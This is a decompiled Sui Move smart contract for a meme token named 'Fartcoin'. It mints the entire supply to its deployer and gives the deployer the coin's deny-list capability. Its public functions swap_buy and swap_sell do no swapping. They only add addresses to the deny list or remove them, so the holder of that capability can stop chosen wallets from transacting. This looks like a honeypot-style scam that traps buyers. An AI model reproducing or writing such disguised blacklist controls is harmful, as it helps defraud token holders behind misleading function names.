module 0x186c3b30b2616ac108981b30e2c8edb658ead85b9a1d25dec19ae755d49d24aa::fartcoin {
    struct FARTCOIN has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: FARTCOIN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<FARTCOIN>(arg0, 9, b"Fartcoin", b"Fartcoin", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmQr3Fz4h1etNsF7oLGMRHiCzhB5y9a7GjyodnF7zLHK1g"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<FARTCOIN>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<FARTCOIN>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<FARTCOIN>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<FARTCOIN>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<FARTCOIN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<FARTCOIN>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<FARTCOIN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<FARTCOIN>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

